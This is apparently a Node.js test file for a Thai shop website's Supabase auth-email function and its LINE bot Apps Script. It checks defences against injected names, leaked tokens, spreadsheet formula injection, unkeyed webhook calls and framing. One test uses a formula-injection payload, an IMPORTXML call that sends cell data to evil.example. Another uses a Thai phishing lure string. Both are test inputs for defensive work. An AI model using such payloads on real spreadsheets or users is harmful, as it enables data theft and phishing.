const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');
const read = file => fs.readFileSync(path.join(__dirname, '..', '..', file), 'utf8');

const PROJECT = 'https://lxvxffrexegvqzeojztw.supabase.co';
const SITE = 'https://okayokay101.github.io/MAXMUXSIX-ONLINEWEB/';
const lure = 'บัญชีถูกระงับ ยืนยันที่ https://evil.example';

test('auth mail never carries a name chosen by whoever signed up', async () => {
    const { buildAuthMessages } = await import('../../supabase/functions/send-auth-email/messages.mjs');
    for (const action of ['signup', 'recovery', 'invite', 'magiclink', 'reauthentication', 'email_change']) {
        const messages = buildAuthMessages({
            user: { email: 'victim@example.com', new_email: 'next@example.com', user_metadata: { name: lure, full_name: lure } },
            email_data: { redirect_to: SITE, site_url: PROJECT, email_action_type: action, token: '123456', token_hash: 'abc' }
        }, { projectUrl: PROJECT, siteUrl: SITE });
        for (const message of messages) {
            assert.ok(!JSON.stringify(message).includes('evil.example'), action);
            assert.match(message.body, /^สวัสดีสมาชิก MAXMUXSIX\n/, action);
        }
    }
});

function lineBot(properties = {}) {
    const rows = {};
    let sheetsOpened = 0;
    const sheet = name => ({
        appendRow: row => (rows[name] ||= []).push(row),
        getDataRange: () => ({ getValues: () => [[]] })
    });
    const sandbox = {
        console: { log() {}, error() {}, warn() {} },
        ContentService: { createTextOutput: text => ({ text }) },
        PropertiesService: { getScriptProperties: () => ({ getProperty: key => properties[key] ?? null }) },
        SpreadsheetApp: { getActiveSpreadsheet: () => { sheetsOpened++; return { getSheetByName: sheet }; } },
        Utilities: { formatDate: () => 'now' },
        UrlFetchApp: { fetch: () => ({ getResponseCode: () => 200, getContentText: () => '{}' }) }
    };
    vm.createContext(sandbox);
    vm.runInContext(read('line_bot_apps_script.js'), sandbox);
    return { sandbox, rows, opened: () => sheetsOpened, ss: { getSheetByName: sheet } };
}

test('the LINE channel token comes from Script Properties, never from the source file', () => {
    const bot = lineBot({ LINE_CHANNEL_ACCESS_TOKEN: 'test-token-from-property' });
    const sent = [];
    bot.sandbox.UrlFetchApp.fetch = (url, options) => { sent.push(options.headers.Authorization); return { getResponseCode: () => 200 }; };
    bot.sandbox.sendLineReply('reply-token', []);
    assert.deepEqual(sent, ['Bearer test-token-from-property']);
    const source = read('line_bot_apps_script.js');
    for (const name of ['CHANNEL_ACCESS_TOKEN', 'ADMIN_USER_ID']) {
        assert.match(source, new RegExp(`const ${name} = scriptProperty\\("LINE_${name}"\\);`));
    }
});

test('customer text is written to the sheet as text, not as a formula', () => {
    const bot = lineBot();
    const attack = '=IMPORTXML("https://evil.example/?"&A1,"//a")';
    bot.sandbox.logChat(bot.ss, '+u', attack, '@reply');
    bot.sandbox.saveOrderToSheet(bot.ss, 'U1', { product: attack, quantity: '-1', customerInfo: '\t=1+1' });
    bot.sandbox.setUserState(bot.ss, '=u', 'STEP', {});
    const cells = Object.values(bot.rows).flat(2).filter(cell => typeof cell === 'string');
    assert.ok(cells.includes("'" + attack));
    assert.deepEqual(cells.filter(cell => /^[=+\-@\t\r]/.test(cell) && cell !== '-'), []);
});

test('ordinary text is stored unchanged', () => {
    const bot = lineBot();
    bot.sandbox.logChat(bot.ss, 'U1', 'สั่งข้าวหลาม 2 กระบอก', 'ตอบแล้ว');
    assert.deepEqual(Array.from(bot.rows.Chat_History[0]).slice(1), ['U1', 'สั่งข้าวหลาม 2 กระบอก', 'ตอบแล้ว']);
});

const key = 'k'.repeat(32);
const post = parameter => ({ parameter, postData: { contents: JSON.stringify({ events: [{ type: 'unfollow', source: { userId: 'U1' } }] }) } });

test('the webhook ignores requests without the secret key, and stays closed when unset', () => {
    for (const [properties, parameter] of [[{}, {}], [{}, { key: '' }], [{ LINE_WEBHOOK_KEY: key }, {}],
        [{ LINE_WEBHOOK_KEY: key }, { key: 'wrong' }], [{ LINE_WEBHOOK_KEY: 'short' }, { key: 'short' }]]) {
        const bot = lineBot(properties);
        assert.equal(bot.sandbox.doPost(post(parameter)).text, 'OK');
        assert.equal(bot.opened(), 0);
    }
});

test('the webhook handles requests carrying the secret key', () => {
    const bot = lineBot({ LINE_WEBHOOK_KEY: key });
    bot.sandbox.doPost(post({ key }));
    assert.ok(bot.opened() > 0);
});

test('the page hides itself when another site frames it', () => {
    assert.match(read('index.html').split('</head>')[0], /<script src="assets\/js\/frame-guard\.js"><\/script>/);
    const run = framed => {
        const window = {}; window.self = window; window.top = framed ? {} : window;
        const document = { documentElement: { style: {} } };
        vm.runInNewContext(read('assets/js/frame-guard.js'), { window, document });
        return document.documentElement.style.display;
    };
    assert.equal(run(true), 'none');
    assert.equal(run(false), undefined);
});
